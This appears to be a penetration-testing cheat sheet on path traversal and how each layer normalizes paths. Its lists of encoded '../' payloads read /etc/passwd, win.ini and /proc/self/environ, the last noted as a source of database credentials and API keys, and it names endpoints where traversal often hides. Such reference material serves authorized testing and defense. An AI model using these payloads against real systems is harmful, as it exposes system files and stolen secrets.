# Path Normalization and Traversal

Every layer normalizes paths differently. The gap between layers is the bug.

---

## The layers and what they do

| Layer | Behaviour |
|---|---|
| Browser | collapses `../`, encodes spaces |
| curl | collapses `../` unless `--path-as-is` |
| CDN | varies; often decodes once, then matches rules |
| Reverse proxy (nginx) | `merge_slashes on` by default, decodes `%XX` |
| App server (Tomcat) | strips `;jsessionid`, decodes |
| Framework router | may or may not decode before matching |
| Filesystem | collapses `..`, resolves symlinks |

**Always send `--path-as-is`.** Otherwise you test curl, not the target.

---

## Traversal payload ladder

```
../../etc/passwd
..%2f..%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd
....//....//etc/passwd
..%c0%af..%c0%afetc/passwd
..;/..;/etc/passwd
..%5c..%5cwindows%5cwin.ini
/etc/passwd
/etc/passwd%00.png
....\/....\/etc/passwd
```

Windows variants: `..\`, `%5c`, `C:\`, `\\?\C:\`, `....\\`.

---

## Prefix and suffix games

If the app prepends a base directory:

```
/var/www/uploads/ + ../../../../etc/passwd
```

If the app appends an extension:

```
/etc/passwd%00        (C strings)
/etc/passwd/.         (trailing dot)
/etc/passwd/..        (dir trick)
```

---

## Absolute path and UNC

```
/etc/passwd
file:///etc/passwd
\\127.0.0.1\share\x
//127.0.0.1/share/x
```

---

## Case and separator on Windows

```
..\..\windows\win.ini
..%5c..%5cwindows%5cwin.ini
C:/windows/win.ini
C:%5cwindows%5cwin.ini
```

---

## Symlink and proc tricks

```
/proc/self/cwd/../../etc/passwd
/proc/self/environ
/proc/self/cmdline
/proc/self/root/etc/passwd
```

`/proc/self/environ` often contains the app's env with DB creds and API keys.

---

## Where traversal hides

- Download/preview endpoints (`?file=`, `?path=`, `?template=`)
- Image resizers (`?src=`, `?url=`)
- Archive extraction (zip-slip: entry names with `../`)
- Template includes (`{% include user_input %}`)
- Log viewers (`?log=`)
- Backup/restore (`?dump=`)
- Static file servers with a prefix (`/static/..%2f..%2f`)

---

## Go deeper

1. Determine the decode count with `%2e` → `%252e` → `%25252e`.
2. Test `merge_slashes` with `//` and `///`.
3. Test `;` matrix params — Tomcat strips them, so `..;/` becomes `..`.
4. Test trailing-dot and trailing-space (Windows trims both).
5. Test with a `Range` header on the traversal result to read past a size cap.

---

## Related

- `02-web/401-to-200.md`
- `11-regex/20-bypass.md`
- `00-core/impact-proof.md`
